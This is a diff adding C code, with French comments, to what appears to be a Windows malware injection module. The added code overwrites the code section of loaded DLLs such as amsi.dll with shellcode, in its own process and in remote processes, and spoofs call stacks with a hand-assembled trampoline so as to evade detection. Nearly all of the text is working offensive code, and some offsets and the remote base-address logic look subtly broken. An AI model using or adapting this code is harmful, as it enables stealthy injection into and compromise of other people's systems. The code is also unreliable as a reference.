@@ -751,3 +751,365 @@ cleanup:
     
     return success;
 }
+
+/* =========================================================================
+ * Module Stomping
+ * Écrase une DLL légitime en mémoire avec notre payload
+ * ========================================================================= */
+
+/*
+ * Liste des DLLs candidates pour le module stomping
+ * DLLs peu utilisées mais présentes dans beaucoup de processus
+ */
+static const char* STOMP_CANDIDATE_DLLS[] = {
+    "amsi.dll",           /* Anti-malware */
+    "clbcatq.dll",        /* COM+ classe */
+    "mscoree.dll",        /* .NET runtime */
+    "dbghelp.dll",        /* Debug helper */
+    NULL
+};
+
+/*
+ * Trouve une DLL chargée dans le processus qui peut être "stompée"
+ */
+static HMODULE FindStompCandidate(void) {
+    for (int i = 0; STOMP_CANDIDATE_DLLS[i]; i++) {
+        HMODULE hMod = GetModuleHandleA(STOMP_CANDIDATE_DLLS[i]);
+        if (hMod) {
+            return hMod;
+        }
+    }
+    
+    /* Si aucune candidate, charge amsi.dll */
+    return LoadLibraryA("amsi.dll");
+}
+
+/*
+ * Module Stomping local - écrase une DLL dans notre propre processus
+ * Utile pour cacher du code dans un module légitime
+ */
+BOOL Injection_ModuleStomp(BYTE* shellcode, DWORD shellcodeSize) {
+    if (!shellcode || shellcodeSize == 0) return FALSE;
+    
+    HMODULE hModule = FindStompCandidate();
+    if (!hModule) return FALSE;
+    
+    /* Parse le PE pour trouver la section .text */
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hModule + dosHeader->e_lfanew);
+    
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
+    PVOID textSection = NULL;
+    DWORD textSize = 0;
+    
+    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+        if (strcmp((char*)section[i].Name, ".text") == 0) {
+            textSection = (PBYTE)hModule + section[i].VirtualAddress;
+            textSize = section[i].Misc.VirtualSize;
+            break;
+        }
+    }
+    
+    if (!textSection || textSize < shellcodeSize) {
+        return FALSE;
+    }
+    
+    /* Change les permissions en RWX */
+    DWORD oldProtect;
+    if (!VirtualProtect(textSection, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        return FALSE;
+    }
+    
+    /* Écrase avec notre shellcode */
+    memcpy(textSection, shellcode, shellcodeSize);
+    
+    /* Restaure les permissions */
+    VirtualProtect(textSection, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    return TRUE;
+}
+
+/*
+ * Module Stomping distant - dans un autre processus
+ */
+BOOL Injection_RemoteModuleStomp(DWORD targetPid, const char* dllName, 
+                                  BYTE* shellcode, DWORD shellcodeSize) {
+    if (!shellcode || shellcodeSize == 0) return FALSE;
+    
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+    if (!hProcess) return FALSE;
+    
+    BOOL success = FALSE;
+    
+    /* Charge la DLL dans le processus distant si pas déjà présente */
+    /* On utilise CreateRemoteThread avec LoadLibraryA */
+    LPVOID loadLib = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+    
+    SIZE_T dllNameLen = strlen(dllName) + 1;
+    LPVOID remoteDllName = VirtualAllocEx(hProcess, NULL, dllNameLen, 
+                                          MEM_COMMIT, PAGE_READWRITE);
+    if (!remoteDllName) goto cleanup;
+    
+    WriteProcessMemory(hProcess, remoteDllName, dllName, dllNameLen, NULL);
+    
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
+                                        (LPTHREAD_START_ROUTINE)loadLib,
+                                        remoteDllName, 0, NULL);
+    if (!hThread) {
+        VirtualFreeEx(hProcess, remoteDllName, 0, MEM_RELEASE);
+        goto cleanup;
+    }
+    
+    WaitForSingleObject(hThread, 5000);
+    
+    DWORD exitCode;
+    GetExitCodeThread(hThread, &exitCode);
+    CloseHandle(hThread);
+    
+    VirtualFreeEx(hProcess, remoteDllName, 0, MEM_RELEASE);
+    
+    if (exitCode == 0) goto cleanup;
+    
+    /* La DLL est chargée, on trouve son adresse via enumération des modules */
+    HMODULE hMods[1024];
+    DWORD cbNeeded;
+    
+    /* Note: nécessite psapi.lib et l'include correspondant
+     * Pour simplifier, on utilise une approche différente */
+    
+    /* Trouve la base de la DLL dans le processus distant */
+    /* Ceci est simplifié - une vraie implémentation utiliserait 
+     * EnumProcessModules ou NtQueryInformationProcess */
+    
+    HMODULE remoteBase = (HMODULE)(ULONG_PTR)exitCode;
+    
+    /* Lit le header PE distant */
+    IMAGE_DOS_HEADER remoteDos;
+    if (!ReadProcessMemory(hProcess, remoteBase, &remoteDos, sizeof(remoteDos), NULL)) {
+        goto cleanup;
+    }
+    
+    IMAGE_NT_HEADERS remoteNt;
+    if (!ReadProcessMemory(hProcess, (PBYTE)remoteBase + remoteDos.e_lfanew, 
+                          &remoteNt, sizeof(remoteNt), NULL)) {
+        goto cleanup;
+    }
+    
+    /* Trouve la section .text */
+    IMAGE_SECTION_HEADER sections[16];
+    if (!ReadProcessMemory(hProcess, 
+                          (PBYTE)remoteBase + remoteDos.e_lfanew + sizeof(IMAGE_NT_HEADERS),
+                          sections, 
+                          sizeof(IMAGE_SECTION_HEADER) * remoteNt.FileHeader.NumberOfSections,
+                          NULL)) {
+        goto cleanup;
+    }
+    
+    PVOID targetAddr = NULL;
+    for (WORD i = 0; i < remoteNt.FileHeader.NumberOfSections && i < 16; i++) {
+        if (strcmp((char*)sections[i].Name, ".text") == 0) {
+            targetAddr = (PBYTE)remoteBase + sections[i].VirtualAddress;
+            break;
+        }
+    }
+    
+    if (!targetAddr) goto cleanup;
+    
+    /* Change les protections */
+    DWORD oldProtect;
+    if (!VirtualProtectEx(hProcess, targetAddr, shellcodeSize, 
+                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        goto cleanup;
+    }
+    
+    /* Écrit le shellcode */
+    if (!WriteProcessMemory(hProcess, targetAddr, shellcode, shellcodeSize, NULL)) {
+        VirtualProtectEx(hProcess, targetAddr, shellcodeSize, oldProtect, &oldProtect);
+        goto cleanup;
+    }
+    
+    /* Restaure les protections */
+    VirtualProtectEx(hProcess, targetAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    success = TRUE;
+    
+cleanup:
+    CloseHandle(hProcess);
+    return success;
+}
+
+/* =========================================================================
+ * Stack Spoofing
+ * Masque la vraie call stack pour éviter la détection
+ * ========================================================================= */
+
+/*
+ * Structure pour sauvegarder le contexte original
+ */
+typedef struct _SPOOF_CONTEXT {
+    PVOID OriginalReturnAddress;
+    PVOID SpoofedReturnAddress;
+    CONTEXT ThreadContext;
+} SPOOF_CONTEXT, *PSPOOF_CONTEXT;
+
+/*
+ * Trouve une adresse de retour "légitime" dans une DLL système
+ */
+static PVOID FindLegitimateReturnAddress(void) {
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    if (!hKernel32) return NULL;
+    
+    /* Cherche une instruction RET dans kernel32 */
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hKernel32;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hKernel32 + dosHeader->e_lfanew);
+    
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
+    
+    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+            PBYTE start = (PBYTE)hKernel32 + section[i].VirtualAddress;
+            DWORD size = section[i].Misc.VirtualSize;
+            
+            /* Cherche un RET (0xC3) */
+            for (DWORD j = 0; j < size - 1; j++) {
+                if (start[j] == 0xC3) {
+                    return start + j;
+                }
+            }
+        }
+    }
+    
+    return NULL;
+}
+
+/*
+ * Crée un trampoline pour spoofer la stack
+ * Le trampoline remplace l'adresse de retour avant d'appeler la vraie fonction
+ */
+BOOL Injection_CreateStackSpoof(PVOID targetFunction, PVOID* outTrampoline) {
+    if (!targetFunction || !outTrampoline) return FALSE;
+    
+    PVOID legitReturn = FindLegitimateReturnAddress();
+    if (!legitReturn) return FALSE;
+    
+    /* Alloue de la mémoire pour le trampoline */
+    PVOID trampoline = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, 
+                                    PAGE_EXECUTE_READWRITE);
+    if (!trampoline) return FALSE;
+    
+    /* Construit le shellcode du trampoline (x64) */
+    /* Ce shellcode:
+     * 1. Sauvegarde l'adresse de retour réelle
+     * 2. Remplace par l'adresse légitime
+     * 3. Appelle la fonction cible
+     * 4. Restaure l'adresse de retour
+     */
+    
+#ifdef _WIN64
+    BYTE trampolineCode[] = {
+        /* push rbp */
+        0x55,
+        /* mov rbp, rsp */
+        0x48, 0x89, 0xE5,
+        /* sub rsp, 0x20 (shadow space) */
+        0x48, 0x83, 0xEC, 0x20,
+        /* mov rax, [rbp+8] (return address) */
+        0x48, 0x8B, 0x45, 0x08,
+        /* push rax (save original) */
+        0x50,
+        /* mov rax, legitReturn */
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        /* mov [rbp+8], rax */
+        0x48, 0x89, 0x45, 0x08,
+        /* mov rax, targetFunction */
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        /* call rax */
+        0xFF, 0xD0,
+        /* pop rcx (restore original return) */
+        0x59,
+        /* mov [rbp+8], rcx */
+        0x48, 0x89, 0x4D, 0x08,
+        /* add rsp, 0x20 */
+        0x48, 0x83, 0xC4, 0x20,
+        /* pop rbp */
+        0x5D,
+        /* ret */
+        0xC3
+    };
+    
+    /* Patch les adresses */
+    *(PVOID*)(trampolineCode + 16) = legitReturn;
+    *(PVOID*)(trampolineCode + 28) = targetFunction;
+    
+    memcpy(trampoline, trampolineCode, sizeof(trampolineCode));
+#else
+    /* Version x86 */
+    BYTE trampolineCode[] = {
+        /* push ebp */
+        0x55,
+        /* mov ebp, esp */
+        0x89, 0xE5,
+        /* mov eax, [ebp+4] */
+        0x8B, 0x45, 0x04,
+        /* push eax */
+        0x50,
+        /* mov dword ptr [ebp+4], legitReturn */
+        0xC7, 0x45, 0x04, 0x00, 0x00, 0x00, 0x00,
+        /* call targetFunction */
+        0xE8, 0x00, 0x00, 0x00, 0x00,
+        /* pop ecx */
+        0x59,
+        /* mov [ebp+4], ecx */
+        0x89, 0x4D, 0x04,
+        /* pop ebp */
+        0x5D,
+        /* ret */
+        0xC3
+    };
+    
+    *(PVOID*)(trampolineCode + 11) = legitReturn;
+    /* Calcule l'offset relatif pour le call */
+    DWORD callOffset = (DWORD)((PBYTE)targetFunction - ((PBYTE)trampoline + 20));
+    *(DWORD*)(trampolineCode + 16) = callOffset;
+    
+    memcpy(trampoline, trampolineCode, sizeof(trampolineCode));
+#endif
+    
+    /* Protège en execute-read */
+    DWORD oldProtect;
+    VirtualProtect(trampoline, 4096, PAGE_EXECUTE_READ, &oldProtect);
+    
+    *outTrampoline = trampoline;
+    return TRUE;
+}
+
+/*
+ * Libère un trampoline
+ */
+BOOL Injection_FreeStackSpoof(PVOID trampoline) {
+    if (!trampoline) return FALSE;
+    return VirtualFree(trampoline, 0, MEM_RELEASE);
+}
+
+/*
+ * Exécute une fonction avec stack spoofing
+ * Remplace temporairement la call stack visible
+ */
+typedef PVOID (*GenericFunc)(PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4);
+
+PVOID Injection_CallWithSpoofedStack(PVOID function, PVOID arg1, PVOID arg2, 
+                                      PVOID arg3, PVOID arg4) {
+    if (!function) return NULL;
+    
+    PVOID trampoline = NULL;
+    if (!Injection_CreateStackSpoof(function, &trampoline)) {
+        /* Fallback: appel direct */
+        return ((GenericFunc)function)(arg1, arg2, arg3, arg4);
+    }
+    
+    PVOID result = ((GenericFunc)trampoline)(arg1, arg2, arg3, arg4);
+    
+    Injection_FreeStackSpoof(trampoline);
+    
+    return result;
+}
